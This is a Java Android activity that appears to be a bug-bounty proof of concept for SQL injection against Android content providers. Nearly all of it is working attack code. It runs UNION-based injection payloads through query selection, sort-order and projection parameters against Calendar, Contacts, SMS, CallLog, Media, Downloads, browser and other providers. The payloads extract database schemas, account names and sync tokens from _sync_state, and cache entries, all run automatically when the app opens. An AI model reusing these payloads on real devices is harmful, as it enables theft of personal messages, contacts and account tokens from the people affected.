package com.vrp.poc;

import android.app.Activity;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.ScrollView;
import android.widget.TextView;

public class CalendarSqliActivity extends Activity {
    private static final String TAG = "CalendarSQLi";
    private TextView logView;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        ScrollView scrollView = new ScrollView(this);
        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setPadding(20, 20, 20, 20);

        logView = new TextView(this);
        logView.setTextSize(10);
        logView.setText("CalendarProvider SQL Injection PoC\nUID: " + android.os.Process.myUid() + "\nPackage: " + getPackageName() + "\n\n");

        Button btnSchema = new Button(this);
        btnSchema.setText("1: Extract DB Schema (sqlite_master)");
        btnSchema.setOnClickListener(v -> extractSchema());

        Button btnSync = new Button(this);
        btnSync.setText("2: Extract _sync_state (account tokens)");
        btnSync.setOnClickListener(v -> extractSyncState());

        Button btnCache = new Button(this);
        btnCache.setText("3: Extract CalendarCache");
        btnCache.setOnClickListener(v -> extractCalendarCache());

        Button btnAll = new Button(this);
        btnAll.setText("RUN ALL SQLi TESTS");
        btnAll.setOnClickListener(v -> {
            extractSchema();
            extractSyncState();
            extractCalendarCache();
        });

        layout.addView(btnAll);
        layout.addView(btnSchema);
        layout.addView(btnSync);
        layout.addView(btnCache);
        layout.addView(logView);
        scrollView.addView(layout);
        setContentView(scrollView);

        log("Ready. App has READ_CALENDAR permission only.");
        log("Attack: UNION-based SQL injection via selection parameter");
        log("Target: content://com.android.calendar/calendars\n");

        extractSchema();
        extractSyncState();
        extractCalendarCache();
        testContactsProviderSqli();
        testSettingsProviderSqli();
        testUserDictSqli();
        testBlockedNumberSqli();
        testTelephonySqli();
        testMediaProviderSqli();
        testCallLogSqli();
        testDownloadProviderSqli();
        testBrowserBookmarksSqli();
        testSmsSqliDeep();
        testUserDictFullExtract();
    }

    private void log(String msg) {
        Log.d(TAG, msg);
        runOnUiThread(() -> logView.append(msg + "\n"));
    }

    private void extractSchema() {
        log("=== TEST 1: Extracting sqlite_master schema ===");
        log("Payload: UNION SELECT sql FROM sqlite_master WHERE type='table'");
        try {
            Uri uri = Uri.parse("content://com.android.calendar/calendars");
            String selection = "1=0) UNION SELECT sql,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35 FROM sqlite_master WHERE type='table'--";
            Cursor cursor = getContentResolver().query(uri, null, selection, null, null);
            if (cursor != null) {
                log("SUCCESS: Got " + cursor.getCount() + " rows from sqlite_master");
                int tableCount = 0;
                while (cursor.moveToNext()) {
                    String schema = cursor.getString(0);
                    if (schema != null && !schema.isEmpty()) {
                        tableCount++;
                        log("TABLE[" + tableCount + "]: " + schema);
                    }
                }
                cursor.close();
                log("Total tables extracted: " + tableCount);
                log("IMPACT: App with READ_CALENDAR accessed internal DB schema");
            } else {
                log("FAILED: cursor is null");
            }
        } catch (Exception e) {
            log("ERROR: " + e.getClass().getSimpleName() + ": " + e.getMessage());
        }
        log("");
    }

    private void extractSyncState() {
        log("=== TEST 2: Extracting _sync_state (account + sync tokens) ===");
        log("Payload: UNION SELECT account_name||'|'||account_type||'|'||data FROM _sync_state");
        try {
            Uri uri = Uri.parse("content://com.android.calendar/calendars");
            String selection = "1=0) UNION SELECT account_name||'|'||account_type||'|'||data,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35 FROM _sync_state--";
            Cursor cursor = getContentResolver().query(uri, null, selection, null, null);
            if (cursor != null) {
                log("SUCCESS: Got " + cursor.getCount() + " rows from _sync_state");
                while (cursor.moveToNext()) {
                    String data = cursor.getString(0);
                    if (data != null && !data.isEmpty()) {
                        log("SYNC_STATE: " + data);
                    }
                }
                cursor.close();
                log("IMPACT: Extracted Google account emails and sync tokens via SQLi");
            } else {
                log("FAILED: cursor is null");
            }
        } catch (Exception e) {
            log("ERROR: " + e.getClass().getSimpleName() + ": " + e.getMessage());
        }
        log("");
    }

    private void testContactsProviderSqli() {
        log("=== TEST 4: ContactsProvider SQL Injection ===");
        try {
            Uri uri = Uri.parse("content://com.android.contacts/raw_contacts");
            String selection = "1=0) UNION SELECT sql,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33 FROM sqlite_master WHERE type='table'--";
            Cursor cursor = getContentResolver().query(uri, null, selection, null, null);
            if (cursor != null) {
                log("ContactsProvider VULNERABLE: " + cursor.getCount() + " rows");
                while (cursor.moveToNext()) {
                    String s = cursor.getString(0);
                    if (s != null && !s.isEmpty()) log("  TABLE: " + s);
                }
                cursor.close();
            } else {
                log("ContactsProvider: cursor null");
            }
        } catch (Exception e) {
            log("ContactsProvider SAFE: " + e.getClass().getSimpleName() + ": " + e.getMessage());
        }
        log("");
    }

    private void testSettingsProviderSqli() {
        log("=== TEST 5: SettingsProvider SQL Injection ===");
        try {
            Uri uri = Uri.parse("content://settings/system");
            String selection = "1=0) UNION SELECT sql,2 FROM sqlite_master WHERE type='table'--";
            Cursor cursor = getContentResolver().query(uri, null, selection, null, null);
            if (cursor != null) {
                log("SettingsProvider VULNERABLE: " + cursor.getCount() + " rows");
                while (cursor.moveToNext()) {
                    String s = cursor.getString(0);
                    if (s != null && !s.isEmpty()) log("  TABLE: " + s);
                }
                cursor.close();
            } else {
                log("SettingsProvider: cursor null");
            }
        } catch (Exception e) {
            log("SettingsProvider SAFE: " + e.getClass().getSimpleName() + ": " + e.getMessage());
        }
        log("");
    }

    private void testUserDictSqli() {
        log("=== TEST 6: UserDictionaryProvider SQL Injection ===");
        Uri uri = Uri.parse("content://user_dictionary/words");
        // Test WHERE injection with different column counts
        for (int cols = 1; cols <= 8; cols++) {
            try {
                StringBuilder sb = new StringBuilder("1=0) UNION SELECT sql");
                for (int i = 2; i <= cols; i++) sb.append(",").append(i);
                sb.append(" FROM sqlite_master WHERE type='table'--");
                Cursor cursor = getContentResolver().query(uri, null, sb.toString(), null, null);
                if (cursor != null) {
                    int count = cursor.getCount();
                    log("UserDict WHERE cols=" + cols + ": " + count + " rows");
                    if (count > 0) {
                        log("VULNERABLE with " + cols + " columns!");
                        while (cursor.moveToNext()) {
                            String s = cursor.getString(0);
                            if (s != null && !s.isEmpty()) log("  TABLE: " + s);
                        }
                        cursor.close();
                        break;
                    }
                    cursor.close();
                } else {
                    log("UserDict WHERE cols=" + cols + ": null cursor");
                }
            } catch (Exception e) {
                log("UserDict WHERE cols=" + cols + " error: " + e.getMessage());
            }
        }
        // Test sortOrder injection
        try {
            Cursor cursor = getContentResolver().query(uri, null, null, null,
                "_id ASC; SELECT sql FROM sqlite_master--");
            if (cursor != null) {
                log("UserDict sortOrder inject: " + cursor.getCount() + " rows");
                cursor.close();
            } else {
                log("UserDict sortOrder: null cursor");
            }
        } catch (Exception e) {
            log("UserDict sortOrder error: " + e.getMessage());
        }
        // Test projection injection
        try {
            String[] proj = {"* FROM sqlite_master--"};
            Cursor cursor = getContentResolver().query(uri, proj, null, null, null);
            if (cursor != null) {
                log("UserDict projection inject: " + cursor.getCount() + " rows, cols=" + cursor.getColumnCount());
                String[] cn = cursor.getColumnNames();
                StringBuilder colStr = new StringBuilder();
                for (String c : cn) colStr.append(c).append(",");
                log("  Cols: " + colStr);
                while (cursor.moveToNext()) {
                    String s = cursor.getString(0);
                    if (s != null) log("  ROW: " + s);
                }
                cursor.close();
            } else {
                log("UserDict projection: null cursor");
            }
        } catch (Exception e) {
            log("UserDict projection error: " + e.getMessage());
        }
        log("");
    }

    private void testBlockedNumberSqli() {
        log("=== TEST 7: BlockedNumberProvider SQL Injection ===");
        try {
            Uri uri = Uri.parse("content://com.android.blockednumber/blocked");
            String selection = "1=0) UNION SELECT sql,2,3 FROM sqlite_master WHERE type='table'--";
            Cursor cursor = getContentResolver().query(uri, null, selection, null, null);
            if (cursor != null) {
                log("BlockedNumber VULNERABLE: " + cursor.getCount() + " rows");
                while (cursor.moveToNext()) {
                    String s = cursor.getString(0);
                    if (s != null && !s.isEmpty()) log("  TABLE: " + s);
                }
                cursor.close();
            } else {
                log("BlockedNumber: cursor null");
            }
        } catch (Exception e) {
            log("BlockedNumber SAFE: " + e.getClass().getSimpleName() + ": " + e.getMessage());
        }
        log("");
    }

    private void testTelephonySqli() {
        log("=== TEST 8: TelephonyProvider (SMS/MMS) SQL Injection ===");
        String[] uris = {
            "content://sms",
            "content://mms",
            "content://mms-sms/conversations",
            "content://telephony/carriers"
        };
        for (String uriStr : uris) {
            try {
                Uri uri = Uri.parse(uriStr);
                Cursor normal = getContentResolver().query(uri, null, null, null, null);
                int normalCols = normal != null ? normal.getColumnCount() : 0;
                if (normal != null) {
                    log(uriStr + " accessible, cols=" + normalCols + " rows=" + normal.getCount());
                    normal.close();
                }
                if (normalCols > 0) {
                    StringBuilder sb = new StringBuilder("1=0) UNION SELECT sql");
                    for (int i = 2; i <= normalCols; i++) sb.append(",").append(i);
                    sb.append(" FROM sqlite_master WHERE type='table'--");
                    Cursor sqli = getContentResolver().query(uri, null, sb.toString(), null, null);
                    if (sqli != null) {
                        log("  SQLi " + uriStr + ": " + sqli.getCount() + " rows");
                        if (sqli.getCount() > 0) {
                            log("  VULNERABLE!");
                            while (sqli.moveToNext()) {
                                String s = sqli.getString(0);
                                if (s != null && !s.isEmpty()) log("    TABLE: " + s);
                            }
                        }
                        sqli.close();
                    }
                }
            } catch (Exception e) {
                log(uriStr + " SAFE/blocked: " + e.getClass().getSimpleName() + ": " + e.getMessage());
            }
        }
        log("");
    }

    private void testMediaProviderSqli() {
        log("=== TEST 9: MediaProvider SQL Injection ===");
        String[] uris = {
            "content://media/external/images/media",
            "content://media/external/audio/media",
            "content://media/external/video/media",
            "content://media/external/file"
        };
        for (String uriStr : uris) {
            try {
                Uri uri = Uri.parse(uriStr);
                Cursor normal = getContentResolver().query(uri, null, null, null, null);
                int normalCols = normal != null ? normal.getColumnCount() : 0;
                if (normal != null) {
                    log(uriStr + " cols=" + normalCols + " rows=" + normal.getCount());
                    normal.close();
                }
                if (normalCols > 0) {
                    StringBuilder sb = new StringBuilder("1=0) UNION SELECT sql");
                    for (int i = 2; i <= normalCols; i++) sb.append(",").append(i);
                    sb.append(" FROM sqlite_master WHERE type='table'--");
                    Cursor sqli = getContentResolver().query(uri, null, sb.toString(), null, null);
                    if (sqli != null && sqli.getCount() > 0) {
                        log("  MediaProvider VULNERABLE at " + uriStr + ": " + sqli.getCount() + " rows");
                        while (sqli.moveToNext()) {
                            String s = sqli.getString(0);
                            if (s != null && !s.isEmpty()) log("    TABLE: " + s);
                        }
                    } else {
                        log("  " + uriStr + " SQLi: 0 rows (safe or empty)");
                    }
                    if (sqli != null) sqli.close();
                }
            } catch (Exception e) {
                log(uriStr + " SAFE: " + e.getClass().getSimpleName());
            }
        }
        log("");
    }

    private void testCallLogSqli() {
        log("=== TEST 10: CallLogProvider SQL Injection ===");
        try {
            Uri uri = Uri.parse("content://call_log/calls");
            Cursor normal = getContentResolver().query(uri, null, null, null, null);
            int cols = normal != null ? normal.getColumnCount() : 0;
            if (normal != null) {
                log("CallLog accessible, cols=" + cols + " rows=" + normal.getCount());
                normal.close();
            }
            if (cols > 0) {
                StringBuilder sb = new StringBuilder("1=0) UNION SELECT sql");
                for (int i = 2; i <= cols; i++) sb.append(",").append(i);
                sb.append(" FROM sqlite_master WHERE type='table'--");
                Cursor sqli = getContentResolver().query(uri, null, sb.toString(), null, null);
                if (sqli != null) {
                    log("CallLog SQLi: " + sqli.getCount() + " rows");
                    if (sqli.getCount() > 0) {
                        log("VULNERABLE!");
                        while (sqli.moveToNext()) {
                            String s = sqli.getString(0);
                            if (s != null && !s.isEmpty()) log("  TABLE: " + s);
                        }
                    }
                    sqli.close();
                }
            }
        } catch (Exception e) {
            log("CallLog: " + e.getClass().getSimpleName() + ": " + e.getMessage());
        }
        log("");
    }

    private void testDownloadProviderSqli() {
        log("=== TEST 11: DownloadProvider SQL Injection ===");
        try {
            Uri uri = Uri.parse("content://downloads/my_downloads");
            Cursor normal = getContentResolver().query(uri, null, null, null, null);
            int cols = normal != null ? normal.getColumnCount() : 0;
            if (normal != null) {
                log("Downloads accessible, cols=" + cols + " rows=" + normal.getCount());
                normal.close();
            }
            if (cols > 0) {
                StringBuilder sb = new StringBuilder("1=0) UNION SELECT sql");
                for (int i = 2; i <= cols; i++) sb.append(",").append(i);
                sb.append(" FROM sqlite_master WHERE type='table'--");
                Cursor sqli = getContentResolver().query(uri, null, sb.toString(), null, null);
                if (sqli != null) {
                    log("Downloads SQLi: " + sqli.getCount() + " rows");
                    if (sqli.getCount() > 0) {
                        log("VULNERABLE!");
                        while (sqli.moveToNext()) {
                            String s = sqli.getString(0);
                            if (s != null && !s.isEmpty()) log("  TABLE: " + s);
                        }
                    }
                    sqli.close();
                }
            }
        } catch (Exception e) {
            log("Downloads: " + e.getClass().getSimpleName() + ": " + e.getMessage());
        }
        log("");
    }

    private void testBrowserBookmarksSqli() {
        log("=== TEST 12: Chrome/Browser Bookmarks SQL Injection ===");
        String[] uris = {
            "content://com.android.chrome.browser/bookmarks",
            "content://com.android.chrome.browser/history",
            "content://com.android.chrome.browser/searches",
            "content://browser/bookmarks"
        };
        for (String uriStr : uris) {
            try {
                Uri uri = Uri.parse(uriStr);
                Cursor normal = getContentResolver().query(uri, null, null, null, null);
                if (normal != null) {
                    int cols = normal.getColumnCount();
                    log(uriStr + " cols=" + cols + " rows=" + normal.getCount());
                    normal.close();
                    StringBuilder sb = new StringBuilder("1=0) UNION SELECT sql");
                    for (int i = 2; i <= cols; i++) sb.append(",").append(i);
                    sb.append(" FROM sqlite_master WHERE type='table'--");
                    Cursor sqli = getContentResolver().query(uri, null, sb.toString(), null, null);
                    if (sqli != null && sqli.getCount() > 0) {
                        log("  VULNERABLE! " + sqli.getCount() + " rows");
                        while (sqli.moveToNext()) {
                            String s = sqli.getString(0);
                            if (s != null && !s.isEmpty()) log("    TABLE: " + s);
                        }
                    }
                    if (sqli != null) sqli.close();
                } else {
                    log(uriStr + " cursor null");
                }
            } catch (Exception e) {
                log(uriStr + ": " + e.getClass().getSimpleName());
            }
        }
        log("");
    }

    private void testSmsSqliDeep() {
        log("=== TEST 14: SMS Provider Deep SQLi Testing ===");
        Uri uri = Uri.parse("content://sms");
        // Normal query
        try {
            Cursor c = getContentResolver().query(uri, null, null, null, null);
            if (c != null) {
                log("SMS normal: " + c.getCount() + " rows, " + c.getColumnCount() + " cols");
                String[] cols = c.getColumnNames();
                StringBuilder sb = new StringBuilder("Columns: ");
                for (String col : cols) sb.append(col).append(",");
                log(sb.toString());
                c.close();
            }
        } catch (Exception e) {
            log("SMS normal error: " + e.getMessage());
        }
        // WHERE injection
        try {
            String sel = "1=0) UNION SELECT sql,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22 FROM sqlite_master WHERE type='table'--";
            Cursor c = getContentResolver().query(uri, null, sel, null, null);
            if (c != null) {
                log("SMS WHERE SQLi: " + c.getCount() + " rows");
                while (c.moveToNext()) {
                    String s = c.getString(0);
                    if (s != null && !s.isEmpty()) log("  TABLE: " + s);
                }
                c.close();
            } else {
                log("SMS WHERE SQLi: null cursor");
            }
        } catch (Exception e) {
            log("SMS WHERE SQLi error: " + e.getClass().getSimpleName() + ": " + e.getMessage());
        }
        // sortOrder injection
        try {
            Cursor c = getContentResolver().query(uri, null, null, null,
                "date ASC; SELECT sql FROM sqlite_master--");
            if (c != null) {
                log("SMS sortOrder inject: " + c.getCount() + " rows");
                c.close();
            } else {
                log("SMS sortOrder: null cursor");
            }
        } catch (Exception e) {
            log("SMS sortOrder error: " + e.getMessage());
        }
        // projection injection
        try {
            String[] proj = {"* FROM sms UNION SELECT sql,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22 FROM sqlite_master--"};
            Cursor c = getContentResolver().query(uri, proj, null, null, null);
            if (c != null) {
                log("SMS projection inject: " + c.getCount() + " rows, cols=" + c.getColumnCount());
                while (c.moveToNext()) {
                    String s = c.getString(0);
                    if (s != null && !s.isEmpty()) log("  ROW[0]: " + s);
                }
                c.close();
            } else {
                log("SMS projection: null cursor");
            }
        } catch (Exception e) {
            log("SMS projection error: " + e.getMessage());
        }
        // LIKE-based boolean blind SQLi
        try {
            String sel = "body LIKE '%' OR 1=1--";
            Cursor c = getContentResolver().query(uri, null, sel, null, null);
            if (c != null) {
                log("SMS boolean blind (1=1): " + c.getCount() + " rows");
                c.close();
            }
        } catch (Exception e) {
            log("SMS boolean blind error: " + e.getMessage());
        }
        log("");
    }

    private void testUserDictFullExtract() {
        log("=== TEST 13: UserDictionary Full Word Extraction ===");
        try {
            Uri uri = Uri.parse("content://user_dictionary/words");
            Cursor cursor = getContentResolver().query(uri, null, null, null, null);
            if (cursor != null) {
                log("UserDict words: " + cursor.getCount() + " rows, cols=" + cursor.getColumnCount());
                String[] colNames = cursor.getColumnNames();
                StringBuilder colStr = new StringBuilder("Columns: ");
                for (String c : colNames) colStr.append(c).append(", ");
                log(colStr.toString());
                while (cursor.moveToNext()) {
                    StringBuilder row = new StringBuilder();
                    for (int i = 0; i < cursor.getColumnCount(); i++) {
                        try { row.append(colNames[i]).append("=").append(cursor.getString(i)).append(" | "); }
                        catch (Exception e) { row.append(colNames[i]).append("=ERR "); }
                    }
                    log("  ROW: " + row.toString());
                }
                cursor.close();

                // Now try SQLi with exact column count
                int numCols = colNames.length;
                log("Trying SQLi with " + numCols + " cols...");
                StringBuilder sb = new StringBuilder("1=0) UNION SELECT sql");
                for (int i = 2; i <= numCols; i++) sb.append(",'").append(i).append("'");
                sb.append(" FROM sqlite_master WHERE type='table'--");
                log("Payload: " + sb.toString());
                Cursor sqli = getContentResolver().query(uri, null, sb.toString(), null, null);
                if (sqli != null) {
                    log("SQLi result: " + sqli.getCount() + " rows");
                    while (sqli.moveToNext()) {
                        String s = sqli.getString(0);
                        if (s != null && !s.isEmpty()) log("  SCHEMA: " + s);
                    }
                    sqli.close();
                }
            } else {
                log("UserDict: null cursor");
            }
        } catch (Exception e) {
            log("UserDict extract: " + e.getClass().getSimpleName() + ": " + e.getMessage());
        }
        log("");
    }

    private void extractCalendarCache() {
        log("=== TEST 3: Extracting CalendarCache ===");
        log("Payload: UNION SELECT key||'='||value FROM CalendarCache");
        try {
            Uri uri = Uri.parse("content://com.android.calendar/calendars");
            String selection = "1=0) UNION SELECT key||'='||value,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35 FROM CalendarCache--";
            Cursor cursor = getContentResolver().query(uri, null, selection, null, null);
            if (cursor != null) {
                log("SUCCESS: Got " + cursor.getCount() + " rows from CalendarCache");
                while (cursor.moveToNext()) {
                    String data = cursor.getString(0);
                    if (data != null && !data.isEmpty()) {
                        log("CACHE: " + data);
                    }
                }
                cursor.close();
                log("IMPACT: Extracted internal cache data not accessible via Calendar API");
            } else {
                log("FAILED: cursor is null");
            }
        } catch (Exception e) {
            log("ERROR: " + e.getClass().getSimpleName() + ": " + e.getMessage());
        }
        log("");
    }
}
